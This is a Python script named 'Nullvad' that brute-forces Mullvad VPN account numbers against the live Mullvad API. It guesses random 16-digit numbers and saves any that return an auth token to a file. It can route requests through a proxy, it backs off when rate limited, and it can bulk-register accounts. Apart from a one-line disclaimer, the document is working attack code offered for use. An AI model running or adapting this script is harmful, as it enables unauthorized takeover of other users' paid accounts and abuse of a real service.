#!/usr/bin/env python3

# Mullvad VPN account brute force, proof of concept
# Do not use this script for unlawful or irresponsible purpose

import argparse
import requests
import json
import random
from os import system, name
import time
from colorama import init, Fore, Style
from plyer import notification

# parse command-line arguments
parser = argparse.ArgumentParser(description = 'Mullvad account # brute forcer.')
parser.add_argument('-r', '--ratelimit', type = int, default = 20, help = 'Rate limit, in seconds. Default: 20')
parser.add_argument('-p', '--proxy', default = '', help = 'Proxy URL including scheme, i.e. socks5h://1.2.3.4:4145. Default: none')
parser.add_argument('-g', '--guesses', type = int, default = 0, help = 'Number of requests to make. Default: Infinite')
parser.add_argument('-n', '--newaccount', help = 'Register new Mullvad account. Default 1, or enter number of accounts to create.')
args = parser.parse_args()

init() # initialize colorama

headers = {
    "Accept": "application/json, text/plain, */*",
    "Accept-Encoding": "gzip, deflate, br",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0",
    "Content-Type": "application/json",
    }

# rate limit to follow, in seconds
if args.ratelimit:
    RATE_LIMIT = args.ratelimit

proxies = {}

# function for Windows notifications
def notify_win(msg):
    if name == 'nt':    # only make notifications if running Windows
        try:
            notification.notify(
                title = 'Nullvad',
                message = msg,
                app_icon = None,
                timeout = 10,
            )
        except:
            print('Error sending notification')
    else:
        pass

# make a random number
def Random(n):
    start = 10**(n-1)
    end = (10**n)-1
    return random.randint(start, end)

# function to register new account
def create_account():
    data = {}
    resp = requests.post('https://api.mullvad.net/www/accounts/', headers=headers, json=data)
    genj = json.loads(resp.text)
    print(Fore.GREEN + 'ID: ' + Style.RESET_ALL + genj['account']['pretty_token'])

def guess():
    n = 10
    randnum = Random(16)
    resps = requests.get('https://api.mullvad.net/www/accounts/' + str(randnum), headers=headers, proxies=proxies)
    if 'auth_token' in resps.text:
        print('SUCCESSFUL ID: ' + str(randnum))
        with open('goodaccounts.txt','a') as file1:
            file1.write(str(randnum) + '\n')
        print('Account number saved to goodaccounts.txt')
    elif resps.status_code == 503:
        print(Fore.RED + 'Warning Rate limit broken! Pausing for 60 seconds' + Style.RESET_ALL)
        notify_win('Rate limit broken. Pausing for 60 seconds.')
        time.sleep(60)
    else:
        print(Fore.RED + 'Invalid credential: ' + Style.RESET_ALL + str(randnum))
        with open('bad.txt', 'a') as file2:
            file2.write(str(randnum) + '\n')

# function to clear screen, cross-platform
def cls():
    if name == 'nt':    # if Windows
        system('title Nullvad')
        system('cls')
    else: system('clear')   # if not Windows

def main():
    cls()
    print(Fore.LIGHTCYAN_EX + '''
     ███▄    █  █    ██  ██▓     ██▓  ██▒   █▓ ▄▄▄      ▓█████▄ 
     ██ ▀█   █  ██  ▓██▒▓██▒    ▓██▒ ▓██░   █▒▒████▄    ▒██▀ ██▌
    ▓██  ▀█ ██▒▓██  ▒██░▒██░    ▒██░  ▓██  █▒░▒██  ▀█▄  ░██   █▌
    ▓██▒  ▐▌██▒▓▓█  ░██░▒██░    ▒██░   ▒██ █░░░██▄▄▄▄██ ░▓█▄   ▌
    ▒██░   ▓██░▒▒█████▓ ░██████▒░██████▒▒▀█░   ▓█   ▓██▒░▒████▓ 
    ░ ▒░   ▒ ▒ ░▒▓▒ ▒ ▒ ░ ▒░▓  ░░ ▒░▓  ░░ ▐░   ▒▒   ▓▒█░ ▒▒▓  ▒ 
    ░ ░░   ░ ▒░░░▒░ ░ ░ ░ ░ ▒  ░░ ░ ▒  ░░ ░░    ▒   ▒▒ ░ ░ ▒  ▒ 
       ░   ░ ░  ░░░ ░ ░   ░ ░     ░ ░     ░░    ░   ▒    ░ ░  ░ 
             ░    ░         ░  ░    ░  ░ by Mike E     ░   ░  ░    
                                          ░              ░      
    ''')
    print(Style.RESET_ALL)

    # if choosing to create new account:
    if args.newaccount:
        print()
        numgen = args.newaccount
        print()
        for x in range(int(numgen)):
            create_account()
        print()

    # if choosing to brute force:
    else:
        if args.proxy:
            proxyinput = args.proxy
        else:
            proxyinput = ''
        proxies = {'https': proxyinput} # must define key as https because api target is https, see requests docs

        if not args.guesses:    # if --guesses not specified, set to 0 = infinite
            num_of_guesses = 0
        elif args.guesses:  # if specified, use --guesses arg as num_of_guesses
            num_of_guesses = args.guesses
        if int(num_of_guesses) == 0:    # run forever
            while True:
                try:
                    guess()
                    time.sleep(RATE_LIMIT)
                except:
                    print('Error, either bad proxy or misspelled url')
                    break
        elif int(num_of_guesses) > 0:   # if choosing to make a certain number of guesses
            for i in range(int(num_of_guesses)):
                try:
                    guess()
                    if int(num_of_guesses) > 1: # only wait for RATE_LIMIT if making more than 1 guess
                        time.sleep(RATE_LIMIT)
                except:
                    print('Error, either bad proxy or misspelled url')
                    print()
                    break

if __name__ == "__main__":
    main()
